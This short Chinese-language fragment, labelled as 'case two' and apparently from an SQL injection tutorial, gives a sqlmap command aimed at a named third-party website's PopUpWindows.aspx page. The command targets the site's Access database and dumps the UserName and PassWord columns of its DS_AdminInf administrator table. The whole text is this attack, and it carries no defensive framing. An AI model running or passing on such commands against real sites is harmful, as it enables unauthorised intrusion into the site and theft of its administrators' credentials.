案例二http://www.020jiaocai.com/PopUpWindows.aspx?id=1sqlmap扫描sqlmap -u "http://www.020jiaocai.com/PopUpWindows.aspx?id=1" --dbms "access"  --dump -C "UserName,PassWord" -T "DS_AdminInf"
